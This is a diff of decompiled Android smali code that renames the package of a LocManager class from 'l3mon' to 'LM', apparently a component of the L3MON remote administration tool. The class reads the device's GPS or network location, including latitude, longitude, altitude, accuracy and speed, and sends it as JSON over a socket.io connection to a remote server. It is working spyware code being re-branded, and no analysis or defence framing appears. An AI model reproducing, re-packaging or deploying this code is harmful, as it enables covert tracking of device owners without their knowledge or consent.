@@ -1,4 +1,4 @@
-.class public Lcom/etechd/l3mon/LocManager;
+.class public Lcom/etechd/LM/LocManager;
 .super Ljava/lang/Object;
 .source "LocManager.java"
 
@@ -46,18 +46,18 @@
     .line 21
     const/4 v0, 0x0
 
-    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isGPSEnabled:Z
+    iput-boolean v0, p0, Lcom/etechd/LM/LocManager;->isGPSEnabled:Z
 
     .line 22
-    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isNetworkEnabled:Z
+    iput-boolean v0, p0, Lcom/etechd/LM/LocManager;->isNetworkEnabled:Z
 
     .line 23
-    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->canGetLocation:Z
+    iput-boolean v0, p0, Lcom/etechd/LM/LocManager;->canGetLocation:Z
 
     .line 42
     const/4 v0, 0x0
 
-    iput-object v0, p0, Lcom/etechd/l3mon/LocManager;->mContext:Landroid/content/Context;
+    iput-object v0, p0, Lcom/etechd/LM/LocManager;->mContext:Landroid/content/Context;
 
     .line 43
     return-void
@@ -73,19 +73,19 @@
     .line 21
     const/4 v0, 0x0
 
-    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isGPSEnabled:Z
+    iput-boolean v0, p0, Lcom/etechd/LM/LocManager;->isGPSEnabled:Z
 
     .line 22
-    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isNetworkEnabled:Z
+    iput-boolean v0, p0, Lcom/etechd/LM/LocManager;->isNetworkEnabled:Z
 
     .line 23
-    iput-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->canGetLocation:Z
+    iput-boolean v0, p0, Lcom/etechd/LM/LocManager;->canGetLocation:Z
 
     .line 47
-    iput-object p1, p0, Lcom/etechd/l3mon/LocManager;->mContext:Landroid/content/Context;
+    iput-object p1, p0, Lcom/etechd/LM/LocManager;->mContext:Landroid/content/Context;
 
     .line 48
-    invoke-virtual {p0}, Lcom/etechd/l3mon/LocManager;->getLocation()Landroid/location/Location;
+    invoke-virtual {p0}, Lcom/etechd/LM/LocManager;->getLocation()Landroid/location/Location;
 
     .line 49
     return-void
@@ -97,7 +97,7 @@
     .locals 1
 
     .line 107
-    iget-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->canGetLocation:Z
+    iget-boolean v0, p0, Lcom/etechd/LM/LocManager;->canGetLocation:Z
 
     return v0
 .end method
@@ -112,7 +112,7 @@
 
     .line 112
     .local v0, "data":Lorg/json/JSONObject;
-    iget-object v1, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v1, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     if-eqz v1, :cond_0
 
@@ -127,28 +127,28 @@
     .line 115
     const-string v1, "latitude"
 
-    iget-wide v2, p0, Lcom/etechd/l3mon/LocManager;->latitude:D
+    iget-wide v2, p0, Lcom/etechd/LM/LocManager;->latitude:D
 
     invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
 
     .line 116
     const-string v1, "longitude"
 
-    iget-wide v2, p0, Lcom/etechd/l3mon/LocManager;->longitude:D
+    iget-wide v2, p0, Lcom/etechd/LM/LocManager;->longitude:D
 
     invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
 
     .line 117
     const-string v1, "altitude"
 
-    iget-wide v2, p0, Lcom/etechd/l3mon/LocManager;->altitude:D
+    iget-wide v2, p0, Lcom/etechd/LM/LocManager;->altitude:D
 
     invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
 
     .line 118
     const-string v1, "accuracy"
 
-    iget v2, p0, Lcom/etechd/l3mon/LocManager;->accuracy:F
+    iget v2, p0, Lcom/etechd/LM/LocManager;->accuracy:F
 
     float-to-double v2, v2
 
@@ -157,7 +157,7 @@
     .line 119
     const-string v1, "speed"
 
-    iget v2, p0, Lcom/etechd/l3mon/LocManager;->speed:F
+    iget v2, p0, Lcom/etechd/LM/LocManager;->speed:F
 
     float-to-double v2, v2
 
@@ -190,7 +190,7 @@
     const-string v1, "gps"
 
     :try_start_0
-    iget-object v2, p0, Lcom/etechd/l3mon/LocManager;->mContext:Landroid/content/Context;
+    iget-object v2, p0, Lcom/etechd/LM/LocManager;->mContext:Landroid/content/Context;
 
     const-string v3, "location"
 
@@ -200,32 +200,32 @@
 
     check-cast v2, Landroid/location/LocationManager;
 
-    iput-object v2, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;
+    iput-object v2, p0, Lcom/etechd/LM/LocManager;->locationManager:Landroid/location/LocationManager;
 
     .line 56
-    iget-object v2, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v2, p0, Lcom/etechd/LM/LocManager;->locationManager:Landroid/location/LocationManager;
 
     invoke-virtual {v2, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z
 
     move-result v2
 
-    iput-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->isGPSEnabled:Z
+    iput-boolean v2, p0, Lcom/etechd/LM/LocManager;->isGPSEnabled:Z
 
     .line 58
-    iget-object v2, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v2, p0, Lcom/etechd/LM/LocManager;->locationManager:Landroid/location/LocationManager;
 
     invoke-virtual {v2, v0}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z
 
     move-result v2
 
-    iput-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->isNetworkEnabled:Z
+    iput-boolean v2, p0, Lcom/etechd/LM/LocManager;->isNetworkEnabled:Z
 
     .line 60
-    iget-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->isGPSEnabled:Z
+    iget-boolean v2, p0, Lcom/etechd/LM/LocManager;->isGPSEnabled:Z
 
     if-nez v2, :cond_0
 
-    iget-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->isNetworkEnabled:Z
+    iget-boolean v2, p0, Lcom/etechd/LM/LocManager;->isNetworkEnabled:Z
 
     if-eqz v2, :cond_2
 
@@ -233,10 +233,10 @@
     :cond_0
     const/4 v2, 0x1
 
-    iput-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->canGetLocation:Z
+    iput-boolean v2, p0, Lcom/etechd/LM/LocManager;->canGetLocation:Z
 
     .line 63
-    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v2, Lcom/etechd/LM/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
 
@@ -244,7 +244,7 @@
 
     const-string v3, "android.permission.ACCESS_FINE_LOCATION"
 
-    sget-object v4, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v4, Lcom/etechd/LM/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
 
@@ -256,7 +256,7 @@
 
     if-nez v2, :cond_2
 
-    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v2, Lcom/etechd/LM/ConnectionManager;->context:Landroid/content/Context;
 
     .line 64
     invoke-virtual {v2}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
@@ -265,7 +265,7 @@
 
     const-string v3, "android.permission.ACCESS_COARSE_LOCATION"
 
-    sget-object v4, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v4, Lcom/etechd/LM/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
 
@@ -278,148 +278,148 @@
     if-nez v2, :cond_2
 
     .line 66
-    iget-boolean v2, p0, Lcom/etechd/l3mon/LocManager;->isNetworkEnabled:Z
+    iget-boolean v2, p0, Lcom/etechd/LM/LocManager;->isNetworkEnabled:Z
 
     if-eqz v2, :cond_1
 
     .line 68
-    iget-object v2, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v2, p0, Lcom/etechd/LM/LocManager;->locationManager:Landroid/location/LocationManager;
 
     if-eqz v2, :cond_1
 
     .line 69
-    iget-object v2, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v2, p0, Lcom/etechd/LM/LocManager;->locationManager:Landroid/location/LocationManager;
 
     invoke-virtual {v2, v0}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;
 
     move-result-object v0
 
-    iput-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iput-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     .line 70
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     if-eqz v0, :cond_1
 
     .line 71
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D
 
     move-result-wide v2
 
-    iput-wide v2, p0, Lcom/etechd/l3mon/LocManager;->latitude:D
+    iput-wide v2, p0, Lcom/etechd/LM/LocManager;->latitude:D
 
     .line 72
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D
 
     move-result-wide v2
 
-    iput-wide v2, p0, Lcom/etechd/l3mon/LocManager;->longitude:D
+    iput-wide v2, p0, Lcom/etechd/LM/LocManager;->longitude:D
 
     .line 73
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v0}, Landroid/location/Location;->getAltitude()D
 
     move-result-wide v2
 
-    iput-wide v2, p0, Lcom/etechd/l3mon/LocManager;->altitude:D
+    iput-wide v2, p0, Lcom/etechd/LM/LocManager;->altitude:D
 
     .line 74
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v0}, Landroid/location/Location;->getAccuracy()F
 
     move-result v0
 
-    iput v0, p0, Lcom/etechd/l3mon/LocManager;->accuracy:F
+    iput v0, p0, Lcom/etechd/LM/LocManager;->accuracy:F
 
     .line 75
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v0}, Landroid/location/Location;->getSpeed()F
 
     move-result v0
 
-    iput v0, p0, Lcom/etechd/l3mon/LocManager;->speed:F
+    iput v0, p0, Lcom/etechd/LM/LocManager;->speed:F
 
     .line 81
     :cond_1
-    iget-boolean v0, p0, Lcom/etechd/l3mon/LocManager;->isGPSEnabled:Z
+    iget-boolean v0, p0, Lcom/etechd/LM/LocManager;->isGPSEnabled:Z
 
     if-eqz v0, :cond_2
 
     .line 82
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     if-nez v0, :cond_2
 
     .line 84
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->locationManager:Landroid/location/LocationManager;
 
     if-eqz v0, :cond_2
 
     .line 85
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->locationManager:Landroid/location/LocationManager;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->locationManager:Landroid/location/LocationManager;
 
     invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;
 
     move-result-object v0
 
-    iput-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iput-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     .line 86
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     if-eqz v0, :cond_2
 
     .line 87
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D
 
     move-result-wide v0
 
-    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->latitude:D
+    iput-wide v0, p0, Lcom/etechd/LM/LocManager;->latitude:D
 
     .line 88
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D
 
     move-result-wide v0
 
-    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->longitude:D
+    iput-wide v0, p0, Lcom/etechd/LM/LocManager;->longitude:D
 
     .line 89
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v0}, Landroid/location/Location;->getAltitude()D
 
     move-result-wide v0
 
-    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->altitude:D
+    iput-wide v0, p0, Lcom/etechd/LM/LocManager;->altitude:D
 
     .line 90
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v0}, Landroid/location/Location;->getAccuracy()F
 
     move-result v0
 
-    iput v0, p0, Lcom/etechd/l3mon/LocManager;->accuracy:F
+    iput v0, p0, Lcom/etechd/LM/LocManager;->accuracy:F
 
     .line 91
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     invoke-virtual {v0}, Landroid/location/Location;->getSpeed()F
 
     move-result v0
 
-    iput v0, p0, Lcom/etechd/l3mon/LocManager;->speed:F
+    iput v0, p0, Lcom/etechd/LM/LocManager;->speed:F
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -438,7 +438,7 @@
     .line 103
     .end local v0    # "e":Ljava/lang/Exception;
     :goto_0
-    iget-object v0, p0, Lcom/etechd/l3mon/LocManager;->location:Landroid/location/Location;
+    iget-object v0, p0, Lcom/etechd/LM/LocManager;->location:Landroid/location/Location;
 
     return-object v0
 .end method
@@ -455,43 +455,43 @@
 
     move-result-wide v0
 
-    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->latitude:D
+    iput-wide v0, p0, Lcom/etechd/LM/LocManager;->latitude:D
 
     .line 130
     invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D
 
     move-result-wide v0
 
-    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->longitude:D
+    iput-wide v0, p0, Lcom/etechd/LM/LocManager;->longitude:D
 
     .line 131
     invoke-virtual {p1}, Landroid/location/Location;->getAltitude()D
 
     move-result-wide v0
 
-    iput-wide v0, p0, Lcom/etechd/l3mon/LocManager;->altitude:D
+    iput-wide v0, p0, Lcom/etechd/LM/LocManager;->altitude:D
 
     .line 132
     invoke-virtual {p1}, Landroid/location/Location;->getAccuracy()F
 
     move-result v0
 
-    iput v0, p0, Lcom/etechd/l3mon/LocManager;->accuracy:F
+    iput v0, p0, Lcom/etechd/LM/LocManager;->accuracy:F
 
     .line 133
     invoke-virtual {p1}, Landroid/location/Location;->getSpeed()F
 
     move-result v0
 
-    iput v0, p0, Lcom/etechd/l3mon/LocManager;->speed:F
+    iput v0, p0, Lcom/etechd/LM/LocManager;->speed:F
 
     .line 135
     :cond_0
-    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;
+    invoke-static {}, Lcom/etechd/LM/IOSocket;->getInstance()Lcom/etechd/LM/IOSocket;
 
     move-result-object v0
 
-    invoke-virtual {v0}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v0}, Lcom/etechd/LM/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v0
 
@@ -501,7 +501,7 @@
 
     const/4 v2, 0x0
 
-    invoke-virtual {p0}, Lcom/etechd/l3mon/LocManager;->getData()Lorg/json/JSONObject;
+    invoke-virtual {p0}, Lcom/etechd/LM/LocManager;->getData()Lorg/json/JSONObject;
 
     move-result-object v3
 
